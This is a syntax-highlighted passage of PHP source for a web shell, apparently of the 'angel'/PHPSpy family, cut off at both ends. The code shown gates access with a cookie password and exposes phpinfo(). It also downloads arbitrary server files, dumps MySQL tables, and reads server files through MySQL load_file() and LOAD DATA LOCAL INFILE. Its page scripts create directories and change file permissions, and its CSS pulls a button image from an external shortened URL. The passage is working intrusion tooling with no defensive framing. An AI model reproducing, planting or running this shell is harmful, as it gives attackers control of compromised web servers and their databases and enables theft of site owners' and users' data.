<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">'login'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pass</span> == encode_pass(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">password</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   scookie(<span style="color: #8abeb7;">'loginpass'</span>,encode_pass(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">password</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@header</span>(<span style="color: #8abeb7;">'Location: '</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">self</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">exit</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_COOKIE</span>[<span style="color: #8abeb7;">'loginpass'</span>]) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_COOKIE</span>[<span style="color: #8abeb7;">'loginpass'</span>] != <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pass</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   loginpage();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   loginpage();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
}
<span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">===================== &#39564;&#35777;&#32467;&#26463; =====================*/</span>

<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">errmsg</span> = <span style="color: #8abeb7;">''</span>;
<span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">action</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">action</span> = <span style="color: #8abeb7;">'file'</span>;

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#26597;&#30475;PHPINFO</span>
<span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">'phpinfo'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">IS_PHPINFO</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   phpinfo();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">exit</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">errmsg</span> = <span style="color: #8abeb7;">'phpinfo() function has non-permissible'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#19979;&#36733;&#25991;&#20214;</span>
<span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">doing</span> == <span style="color: #8abeb7;">'downfile'</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">thefile</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span>@file_exists(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">thefile</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">errmsg</span> = <span style="color: #8abeb7;">'The file you want Downloadable was nonexistent'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileinfo</span> = pathinfo(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">thefile</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   header(<span style="color: #8abeb7;">'Content-type: application/x-'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileinfo</span>[<span style="color: #8abeb7;">'extension'</span>]);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   header(<span style="color: #8abeb7;">'Content-Disposition: attachment; filename='</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileinfo</span>[<span style="color: #8abeb7;">'basename'</span><span style="text-decoration: underline;">]);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   header(<span style="color: #8abeb7;">'Content-Length: '</span>.filesize(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">thefile</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@readfile</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">thefile</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">exit</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#30452;&#25509;&#19979;&#36733;&#22791;&#20221;&#25968;&#25454;&#24211;</span>
<span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">doing</span> == <span style="color: #8abeb7;">'backupmysql'</span> &amp;&amp; <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">saveasfile</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">errmsg</span> =<span style="color: #8abeb7;">'Please choose the table'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mysqllink</span> = mydbconn(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbhost</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbuser</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbpass</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbname</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">charset</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbp</span><span style="color: #f0c674; text-decoration: underline;">ort</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filename</span> = basename(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbname</span>.<span style="color: #8abeb7;">'.sql'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   header(<span style="color: #8abeb7;">'Content-type: application/unknown'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   header(<span style="color: #8abeb7;">'Content-Disposition: attachment; filename='</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filename</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">k</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">v</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">v</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   sqldumptable(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">v</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   mysql_close();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">exit</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#36890;&#36807;MYSQL&#19979;&#36733;&#25991;&#20214;</span>
<span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">doing</span>==<span style="color: #8abeb7;">'mysqldown'</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbname</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">errmsg</span> = <span style="color: #8abeb7;">'Please input dbname'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mysqllink</span> = mydbconn(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbhost</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbuser</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbpass</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbname</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">charset</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbp</span><span style="color: #f0c674; text-decoration: underline;">ort</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span>file_exists(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mysqldlfile</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">errmsg</span> = <span style="color: #8abeb7;">'The file you want Downloadable was nonexistent'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span> = q(<span style="color: #8abeb7;">"select load_file('</span><span style="color: #f0c674;">$mysqldlfile</span><span style="color: #8abeb7;">');"</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   q(<span style="color: #8abeb7;">"DROP TABLE IF EXISTS tmp_angel;"</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   q(<span style="color: #8abeb7;">"CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);"</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#29992;&#26102;&#38388;&#25139;&#26469;&#34920;&#31034;&#25130;&#26029;,&#36991;&#20813;&#20986;&#29616;&#35835;&#21462;&#33258;&#36523;&#25110;&#21253;&#21547;__angel_1111111111_eof__&#30340;&#25991;&#20214;&#26102;&#19981;&#23436;&#25972;&#30340;&#24773;&#20917;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   q(<span style="color: #8abeb7;">"LOAD DATA LOCAL INFILE '"</span>.addslashes(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mysqldlfile</span>).<span style="color: #8abeb7;">"' INTO TA</span><span style="color: #8abeb7; text-decoration: underline;">BLE tmp_angel FIELDS TERMINATED BY '__angel_</span><span style="color: #f0c674; text-decoration: underline;">{$timestamp}</span><span style="color: #8abeb7; text-decoration: underline;">_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_</span><span style="color: #f0c674; text-decoration: underline;">{$timestamp}</span><span style="color: #8abeb7; text-decoration: underline;">_eof__';"</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span> = q(<span style="color: #8abeb7;">"select content from tmp_angel"</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   q(<span style="color: #8abeb7;">"DROP TABLE tmp_angel"</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span> = @mysql_fetch_array(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">errmsg</span> = <span style="color: #8abeb7;">'Load file failed '</span>.mysql_error();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileinfo</span> = pathinfo(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mysqldlfile</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   header(<span style="color: #8abeb7;">'Content-type: application/x-'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileinfo</span>[<span style="color: #8abeb7;">'extension'</span>]);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   header(<span style="color: #8abeb7;">'Content-Disposition: attachment; filename='</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileinfo</span>[<span style="color: #8abeb7;">'b</span><span style="color: #8abeb7; text-decoration: underline;">asename'</span><span style="text-decoration: underline;">]);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   header(<span style="color: #8abeb7;">"Accept-Length: "</span>.strlen(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[0]));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[0];
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">exit</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
}

<span style="color: #b294bb;">?&gt;</span>
&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=<span style="color: #8abeb7;">"Content-Type"</span> content=<span style="color: #8abeb7;">"text/html; charset=gbk"</span>&gt;
&lt;title&gt;<span style="color: #b294bb;">&lt;?</span>php <span style="color: #b5bd68;">echo</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">action</span>.<span style="color: #8abeb7;">' - '</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_HOST'</span>];<span style="color: #b294bb;">?&gt;</span>&lt;/title&gt;
&lt;style type=<span style="color: #8abeb7;">"text/css"</span>&gt;
body,td{<span style="color: #81a2be;">font</span>: 12px Arial,Tahoma;line-height: 16px;}
.input{<span style="color: #81a2be;">font</span>:12px Arial,Tahoma;<span style="color: #81a2be;">background</span>:<span style="color: #969896; font-style: italic;">#fff;border: 1px solid #666;padding:2px</span><span style="color: #969896; font-style: italic; text-decoration: underline;">;height:22px;}</span>
.area{<span style="color: #81a2be;">font</span>:12px <span style="color: #8abeb7;">'Courier New'</span>, Monospace;<span style="color: #81a2be;">background</span>:<span style="color: #969896; font-style: italic;">#fff;border: 1px solid #666;</span><span style="color: #969896; font-style: italic; text-decoration: underline;">padding:2px;}</span>
.bt {border-color:<span style="color: #969896; font-style: italic;">#b0b0b0;background:#3d3d3d url(http://t.cn/zRymOgc);color:#fff</span><span style="color: #969896; font-style: italic; text-decoration: underline;">fff;font:12px Arial,Tahoma;height:22px;}</span>
a {<span style="color: #81a2be;">color</span>: <span style="color: #969896; font-style: italic;">#00f;text-decoration:underline;}</span>
<span style="color: #81a2be;">a</span>:hover{<span style="color: #81a2be;">color</span>: <span style="color: #969896; font-style: italic;">#f00;text-decoration:none;}</span>
.alt1 td{border-top:1px solid <span style="color: #969896; font-style: italic;">#fff;border-bottom:1px solid #ddd;background:#f1f1</span><span style="color: #969896; font-style: italic; text-decoration: underline;">f1;padding:5px 15px 5px 5px;}</span>
.alt2 td{border-top:1px solid <span style="color: #969896; font-style: italic;">#fff;border-bottom:1px solid #ddd;background:#f9f9</span><span style="color: #969896; font-style: italic; text-decoration: underline;">f9;padding:5px 15px 5px 5px;}</span>
.focus td{border-top:1px solid <span style="color: #969896; font-style: italic;">#fff;border-bottom:1px solid #ddd;background:#fff</span><span style="color: #969896; font-style: italic; text-decoration: underline;">faa;padding:5px 15px 5px 5px;}</span>
.head td{border-top:1px solid <span style="color: #969896; font-style: italic;">#fff;border-bottom:1px solid #ddd;background:#e9e9</span><span style="color: #969896; font-style: italic; text-decoration: underline;">e9;padding:5px 15px 5px 5px;font-weight:bold;}</span>
.head td span{font-weight:normal;}
.infolist {<span style="color: #81a2be;">padding</span>:10px;<span style="color: #81a2be;">margin</span>:10px 0 20px 0;<span style="color: #81a2be;">background</span>:<span style="color: #969896; font-style: italic;">#F1F1F1;border:1px solid</span><span style="color: #969896; font-style: italic; text-decoration: underline;"> #ddd;}</span>
form{<span style="color: #81a2be;">margin</span>:0;<span style="color: #81a2be;">padding</span>:0;}
h2{<span style="color: #81a2be;">margin</span>:0;<span style="color: #81a2be;">padding</span>:0;<span style="color: #81a2be;">height</span>:24px;line-height:24px;font-size:14px;<span style="color: #81a2be;">color</span>:<span style="color: #969896; font-style: italic;">#5B686F;</span><span style="color: #969896; font-style: italic; text-decoration: underline;">}</span>
ul.info li{<span style="color: #81a2be;">margin</span>:0;<span style="color: #81a2be;">color</span>:<span style="color: #969896; font-style: italic;">#444;line-height:24px;height:24px;}</span>
u{text-decoration: none;<span style="color: #81a2be;">color</span>:<span style="color: #969896; font-style: italic;">#777;float:left;display:block;width:150px;margin-r</span><span style="color: #969896; font-style: italic; text-decoration: underline;">ight:10px;}</span>
.drives{<span style="color: #81a2be;">padding</span>:5px;}
.drives span {<span style="color: #81a2be;">margin</span>:auto 7px;}
&lt;/style&gt;
&lt;script type=<span style="color: #8abeb7;">"text/javascript"</span>&gt;
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">CheckAll</span>(form) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">for</span>(<span style="color: #b5bd68;">var</span> i=0;i&lt;form.elements.length;i++) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">var</span> e = form.elements[i];
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (e.name != <span style="color: #8abeb7;">'chkall'</span>)
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   e.checked = form.chkall.checked;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">$</span>(<span style="color: #81a2be;">id</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> document.getElementById(id);
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">createdir</span>(){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">var</span> newdirname;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   newdirname = prompt(<span style="color: #8abeb7;">'Please input the directory name:'</span>, <span style="color: #8abeb7;">''</span>  );
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span>newdirname) <span style="color: #b5bd68;">return</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'createdir'</span>).newdirname.value=newdirname;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'createdir'</span>).submit();
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">fileperm</span>(<span style="color: #81a2be;">pfile</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">var</span> newperm;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   newperm = prompt(<span style="color: #8abeb7;">'Current file:'</span>+pfile+<span style="color: #8abeb7;">'\nPlease input new attribute:'</span>, <span style="color: #8abeb7;">''</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span>newperm) <span style="color: #b5bd68;">return</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'fileperm'</span>).newperm.value=newperm;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'fileperm'</span>).pfile.value=pfile;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'fileperm'</span>).submit();
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">copyfile</span>(<span style="color: #81a2be;">sname</span>){
